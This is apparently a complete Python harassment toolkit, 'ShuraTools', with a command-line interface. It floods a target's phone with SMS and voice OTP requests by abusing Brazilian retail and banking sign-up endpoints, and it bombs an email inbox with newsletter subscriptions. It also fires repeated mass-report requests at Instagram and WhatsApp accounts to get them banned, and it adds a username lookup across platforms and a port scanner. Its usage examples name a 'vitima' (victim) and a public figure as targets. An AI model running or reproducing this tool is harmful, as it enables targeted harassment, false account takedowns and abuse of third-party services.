#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShuraTools v12.0 ULTIMATE CLI EDITION
Flags: --sms --call --email --ig --zap --osint --scan --target --qty --threads --delay
Ex: python ShuraTools.py --sms --target 5511999999999 --qty 30 --threads 10 --delay 2
"""

import os, sys, time, random, argparse, threading, socket
from concurrent.futures import ThreadPoolExecutor

try:
    import requests
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    print("[!] pip install requests colorama")
    sys.exit(1)

BANNER = f"""
{Fore.RED}███████╗██╗  ██╗██╗   ██╗██████╗  █████╗ 
{Fore.RED}██╔════╝██║  ██║██║   ██║██╔══██╗██╔══██╗
{Fore.RED}███████╗███████║██║   ██║██████╔╝███████║
{Fore.RED}╚════██║██╔══██║██║   ██║██╔══██╗██╔══██║
{Fore.RED}███████║██║  ██║╚██████╔╝██║  ██║██║  ██║
{Fore.RED}╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
{Fore.YELLOW}  SMS | Call | Email | IG | Zap | OSINT | Scan
{Fore.WHITE}     v12.0 ULTIMATE CLI EDITION - by Shura
"""

LOCK = threading.Lock()
stats = {"success": 0, "fail": 0}

def log(m, t="i"):
    c = {"i": Fore.WHITE+"[*] ", "s": Fore.GREEN+"[+] ", "e": Fore.RED+"[-] ", "w": Fore.YELLOW+"[!] "}
    with LOCK: print(f"{c.get(t, Fore.WHITE)}{m}{Style.RESET_ALL}")

# ========== API DATABASE ==========
APIS = {
    "sms": [
        {"n": "iFood", "u": "https://marketplace.ifood.com.br/v1/merchants/search/phone-number", "d": {"phoneNumber": "{T}"}, "h": {"Content-Type": "application/json"}},
        {"n": "Magalu", "u": "https://sacola.magazineluiza.com.br/api/v1/customer/send-otp", "d": {"phone": "{T}"}, "h": {"Content-Type": "application/json"}},
        {"n": "Shopee", "u": "https://shopee.com.br/api/v2/authentication/send_code", "d": {"phone": "{T}", "type": 1}, "h": {"Content-Type": "application/json"}},
        {"n": "TikTok", "u": "https://www.tiktok.com/passport/web/send_code/", "d": {"mobile": "{T}", "account_sdk_source": "web"}, "h": {"Content-Type": "application/json"}},
        {"n": "OLX", "u": "https://www.olx.com.br/api/auth/authenticate", "d": {"phone": "{T}"}, "h": {"Content-Type": "application/json"}}
    ],
    "call": [
        {"n": "QuintoAndar", "u": "https://api.quintoandar.com.br/api/v1/auth/send-otp", "d": {"phone": "{T}", "method": "VOICE"}, "h": {"Content-Type": "application/json"}},
        {"n": "Inter", "u": "https://api.inter.co/v1/auth/request-otp", "d": {"phone": "{T}", "type": "VOICE"}, "h": {"Content-Type": "application/json"}},
        {"n": "iFood", "u": "https://wsloja.ifood.com.br/api/v1/customers/phone/verify", "d": {"phone": "{T}", "method": "call"}, "h": {"Content-Type": "application/json"}}
    ],
    "email": [
        {"n": "Tecnoblog", "u": "https://tecnoblog.net/wp-admin/admin-ajax.php", "d": {"action": "tnp", "na": "s", "ne": "{T}", "ny": "on"}, "h": {}},
        {"n": "TheNews", "u": "https://thenewscc.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
        {"n": "InvestNews", "u": "https://investnews.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
        {"n": "TheBrief", "u": "https://thebrief.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
        {"n": "Startups", "u": "https://startups.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}}
    ]
}

# ========== BOMBER ENGINE ==========
def bomber(target, mode, qty, threads, delay):
    global stats
    stats = {"success": 0, "fail": 0}
    apis = APIS.get(mode, [])
    
    log(f"Iniciando {mode.upper()} Bomber", "w")
    log(f"Target: {target} | Qty: {qty} | Threads: {threads} | Delay: {delay}s", "i")
    
    def attack(api, idx):
        try:
            data = {k: v.replace("{T}", target) if isinstance(v, str) else v for k, v in api["d"].items()}
            res = requests.post(api["u"], json=data, headers=api["h"], timeout=10)
            
            if res.status_code < 400:
                with LOCK: stats["success"] += 1
                log(f"[{idx+1}/{qty}] {api['n']} → OK", "s")
            else:
                with LOCK: stats["fail"] += 1
                log(f"[{idx+1}/{qty}] {api['n']} → {res.status_code}", "w")
            
            time.sleep(delay)
        except:
            with LOCK: stats["fail"] += 1
            log(f"[{idx+1}/{qty}] {api['n']} → Timeout", "e")
    
    with ThreadPoolExecutor(max_workers=threads) as exe:
        for i in range(qty):
            exe.submit(attack, random.choice(apis), i)
    
    log(f"Concluído! ✓ {stats['success']} | ✗ {stats['fail']}", "i")

# ========== MASS REPORT ==========
def mass_report(target, platform, qty, threads):
    log(f"{platform.upper()} Mass Report: {target}", "w")
    
    if platform == "ig":
        url = "https://i.instagram.com/api/v1/users/web_report/"
        data = {"username": target, "source_name": "profile", "reason_id": "spam"}
    else:  # zap
        url = "https://v.whatsapp.net/v2/report"
        data = {"phone": target, "reason": "spam"}
    
    def report(idx):
        try:
            res = requests.post(url, data=data, headers={"User-Agent": "Instagram 150.0.0.0"}, timeout=5)
            if res.status_code < 400:
                log(f"Report {idx+1}/{qty} → OK", "s")
            else:
                log(f"Report {idx+1}/{qty} → {res.status_code}", "w")
        except:
            log(f"Report {idx+1}/{qty} → Timeout", "e")
    
    with ThreadPoolExecutor(max_workers=threads) as exe:
        for i in range(qty):
            exe.submit(report, i)
            time.sleep(0.5)

# ========== OSINT ==========
def osint(target):
    log(f"OSINT Hunter: {target}", "w")
    u = target.replace("@", "")
    platforms = {
        "Instagram": f"https://www.instagram.com/{u}/",
        "GitHub": f"https://github.com/{u}",
        "TikTok": f"https://www.tiktok.com/@{u}",
        "Twitter": f"https://twitter.com/{u}",
        "LinkedIn": f"https://www.linkedin.com/in/{u}",
        "Facebook": f"https://www.facebook.com/{u}",
        "Reddit": f"https://www.reddit.com/user/{u}",
        "YouTube": f"https://www.youtube.com/@{u}",
        "Twitch": f"https://www.twitch.tv/{u}",
        "Medium": f"https://medium.com/@{u}"
    }
    
    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    for name, url in platforms.items():
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                log(f"{name}: {Fore.GREEN}ENCONTRADO{Style.RESET_ALL}", "s")
                print(f"   {Fore.BLUE}→ {url}{Style.RESET_ALL}")
            else:
                log(f"{name}: Não encontrado", "i")
        except:
            log(f"{name}: Timeout", "e")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")

# ========== PORT SCANNER ==========
def port_scan(target):
    log(f"Scanning {target}...", "w")
    try:
        ip = socket.gethostbyname(target)
        log(f"IP: {Fore.GREEN}{ip}{Style.RESET_ALL}", "i")
        
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        for p in [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 5432, 8080, 8443]:
            s = socket.socket()
            s.settimeout(0.5)
            if s.connect_ex((ip, p)) == 0:
                log(f"Port {p} → {Fore.GREEN}OPEN{Style.RESET_ALL}", "s")
            s.close()
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
    except Exception as e:
        log(f"Erro: {e}", "e")

# ========== CLI ==========
def main():
    print(BANNER)
    
    ap = argparse.ArgumentParser(description="ShuraTools - Ultimate CLI Edition")
    ap.add_argument("--sms", action="store_true", help="SMS Bomber")
    ap.add_argument("--call", action="store_true", help="Call Bomber")
    ap.add_argument("--email", action="store_true", help="Email Bomber")
    ap.add_argument("--ig", action="store_true", help="Instagram Mass Report")
    ap.add_argument("--zap", action="store_true", help="WhatsApp Mass Report")
    ap.add_argument("--osint", action="store_true", help="OSINT Hunter")
    ap.add_argument("--scan", action="store_true", help="Port Scanner")
    ap.add_argument("--target", required=True, help="Alvo (email, phone, @user, IP)")
    ap.add_argument("--qty", type=int, default=20, help="Quantidade (padrão: 20)")
    ap.add_argument("--threads", type=int, default=5, help="Threads (padrão: 5)")
    ap.add_argument("--delay", type=float, default=2.0, help="Delay em segundos (padrão: 2)")
    
    args = ap.parse_args()
    
    # Executa as ações
    if args.sms:
        bomber(args.target, "sms", args.qty, args.threads, args.delay)
    
    if args.call:
        bomber(args.target, "call", args.qty, args.threads, args.delay)
    
    if args.email:
        bomber(args.target, "email", args.qty, args.threads, args.delay)
    
    if args.ig:
        mass_report(args.target, "ig", args.qty, args.threads)
    
    if args.zap:
        mass_report(args.target, "zap", args.qty, args.threads)
    
    if args.osint:
        osint(args.target)
    
    if args.scan:
        port_scan(args.target)
    
    # Se nenhuma flag foi passada, mostra help
    if not any([args.sms, args.call, args.email, args.ig, args.zap, args.osint, args.scan]):
        ap.print_help()
        print(f"\n{Fore.YELLOW}Exemplos de uso:{Style.RESET_ALL}")
        print(f"  python ShuraTools.py --sms --target 5511999999999 --qty 30 --threads 10 --delay 2")
        print(f"  python ShuraTools.py --email --target vitima@gmail.com --qty 50 --delay 1")
        print(f"  python ShuraTools.py --ig --target elonmusk --qty 100")
        print(f"  python ShuraTools.py --osint --target elonmusk")
        print(f"  python ShuraTools.py --scan --target google.com")

if __name__ == "__main__":
    main()
